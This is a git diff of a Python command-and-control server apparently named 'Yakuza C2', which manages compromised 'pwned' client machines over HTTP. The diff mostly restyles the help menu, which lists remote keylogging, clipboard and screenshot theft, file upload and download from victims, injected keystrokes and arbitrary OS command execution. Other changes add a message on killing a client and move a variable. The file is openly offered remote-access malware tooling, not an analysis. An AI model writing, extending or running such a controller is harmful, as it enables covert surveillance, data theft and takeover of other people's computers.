@@ -1,7 +1,9 @@
-"""
-Command & Control Server Side Coding
+""" c2_server.py -
+Yakuza Command & Control (C2) Server codes
 Author: Davood Yahay(D.Yakuza)
+Last Update: 10 oct 2024, 16 mehr 1403
 """
+
 
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 from os import path, mkdir, listdir, system
@@ -35,7 +37,9 @@ def get_new_client():
 
     # If pwnedDict is empty, Re initialize pwnedId & activeSession
     if len(pwnedDict) == 1:
-        print(Fore.LIGHTBLUE_EX + "\n[...] Waiting for a new Connection!. \n" + Fore.RESET)
+        print(Fore.LIGHTBLUE_EX + "[+] Waiting for a new Connection... \n" + Fore.RESET)
+
+        # Re-initialize pwnedDict & pwnedId & activeClient
         pwnedDict = {}
         pwnedId = 0
         activeClient = 1
@@ -254,34 +258,40 @@ class C2Handler(BaseHTTPRequestHandler):
 
                     elif command == "server help":
                         # Print Client Commands
-                        print("Client Commands:",
-                              "client download FILENAME => transfer a file from the server to the client",
-                              "client upload FILENAME => transfer a file from the client to the server",
-                              "client zip FILENAME => zip and encrypt a file on the client",
-                              "client unzip FILENAME => unzip and decrypt a file on the client",
-                              "client kill => permanently shutdown the active client",
-                              "client delay SECONDS => change the delay setting for a client's reconnection attempts",
-                              "client get clipboard => grab a copy of the client's clipboard",
-                              "client keylog on => start up a keylogger on the client",
-                              "client keylog off => turn off the keylogger on the client and write the results to disk",
-                              "client type TEXT => Type the text you choice on a client's keyboard",
-                              "client screenshot => grab a copy of the client's screens",
-                              "client display IMAGE => display an image on the client's screen",
-                              "client flip screen - client flip => flip a client's screen upside down",
-                              "client rotate screen - client rotate => flip a client's screen upside down",
-                              "client max sound - client max => turn a client's volume all the way up",
-                              "client play FILENAME.wav => play a .wav sound file on the client",
-                              "* => run an OS command on the client that doesn't require input",
-                              "* & => run an OS command on the client in the background", sep="\n")
+                        print("\033[1;32m" + "===> Client Commands <===" + "\033[0m")
+                        print(
+                            "\033[1;34mclient download FILENAME\033[0m  => transfer a file from the server to the client",
+                            "\033[1;34mclient upload FILENAME\033[0m    => transfer a file from the client to the server",
+                            "\033[1;34mclient zip FILENAME\033[0m       => zip and encrypt a file on the client",
+                            "\033[1;34mclient unzip FILENAME\033[0m     => unzip and decrypt a file on the client",
+                            "\033[1;34mclient kill\033[0m               => permanently shutdown the active client",
+                            "\033[1;34mclient delay SECONDS\033[0m      => change the delay setting for a client's reconnection attempts",
+                            "\033[1;34mclient get clipboard\033[0m      => grab a copy of the client's clipboard",
+                            "\033[1;34mclient keylog on\033[0m          => start up a keylogger on the client",
+                            "\033[1;34mclient keylog off\033[0m         => turn off the keylogger on the client and write the results to disk",
+                            "\033[1;34mclient type TEXT\033[0m          => type the text you choose on a client's keyboard",
+                            "\033[1;34mclient screenshot\033[0m         => grab a copy of the client's screen",
+                            "\033[1;34mclient display IMAGE\033[0m      => display an image on the client's screen",
+                            "\033[1;34mclient max sound\033[0m          => turn a client's volume all the way up",
+                            "\033[1;34mclient play FILENAME.wav\033[0m => play a .wav sound file on the client (Windows Only)",
+                            "\033[1;34mclient flip screen\033[0m        => flip a client's screen upside down (Windows Only)",
+                            "\033[1;34mclient rotate screen\033[0m      => rotate a client's screen upside down (Windows Only)",
+                            "\033[1;34m*\033[0m                        => run an OS command on the client that doesn't require input",
+                            "\033[1;34m* &\033[0m                      => run an OS command on the client in the background",
+                            sep="\n"
+                        )
                         # Print Server Commands
-                        print("\nServer Commands:",
-                              "server show clients => print an active listing of our pwned clients",
-                              "server control PWNED_ID => change the active client that you have a prompt for",
-                              "server zip FILENAME => zip and encrypt a file in the outgoing folder on the server",
-                              "server unzip FILENAME => unzip and decrypt a file in the incoming folder on the server",
-                              "server list DIRECTORY => obtain a file listing of a directory on the server",
-                              "server shell => obtain a shell on the server",
-                              "server exit => gracefully shuts down the server",sep="\n")
+                        print("\n\033[1;32m" + "===> Server Commands <===" + "\033[0m")
+                        print(
+                            "\033[1;33mserver show clients\033[0m      => print an active listing of our pwned clients",
+                            "\033[1;33mserver control PWNED_ID\033[0m  => change the active client that you have a prompt for",
+                            "\033[1;33mserver zip FILENAME\033[0m      => zip and encrypt a file in the outgoing folder on the server",
+                            "\033[1;33mserver unzip FILENAME\033[0m    => unzip and decrypt a file in the incoming folder on the server",
+                            "\033[1;33mserver list DIRECTORY\033[0m    => obtain a file listing of a directory on the server",
+                            "\033[1;33mserver shell\033[0m             => obtain a shell on the server",
+                            "\033[1;33mserver exit\033[0m              => gracefully shuts down the server",
+                            sep="\n"
+                        )
 
                     # Must respond to the client after a server command to cleanly finish the connection
                     self.http_response(204)
@@ -314,6 +324,7 @@ class C2Handler(BaseHTTPRequestHandler):
                     else:
                         # If we have just killed a client, try to get a new session to set it active
                         if command == "client kill":
+                            print(f"[+]-Server => {pwnedDict[activeClient]} has been killed. \n")
                             get_new_client()
 
             # if client in the pwnedDict but is Not Active Session
@@ -458,6 +469,9 @@ pwnedId = 0
 # value follow this pattern => (account@hostname@epoch time)
 pwnedDict = {}
 
+# This a current working directory from the client belonging to active session
+cwd = "~"
+
 # If the INCOMING Directory is not present on our c2 server, Create it
 if not path.isdir(INCOMING):
     mkdir(INCOMING)
@@ -466,15 +480,11 @@ if not path.isdir(INCOMING):
 if not path.isdir(OUTGOING):
     mkdir(OUTGOING)
 
-# This a current working directory from the client belonging to active session
-cwd = "~"
-
 # Instance from HTTP Server
 # noinspection PyTypeChecker
 server = ThreadingHTTPServer((BIND_ADDR, PORT), C2Handler)
 
-# Print C2 Server Side Message for avoid complexing in test operation
-print(Fore.LIGHTMAGENTA_EX + "\n[+]-------------C2 Server Side-------------[+]\nWait for C2 Client...\n" + Fore.RESET)
+print(Fore.LIGHTBLUE_EX + "[+] Waiting for a new Connection... \n" + Fore.RESET)
 
 # Run Server in infinity Loop
 try:
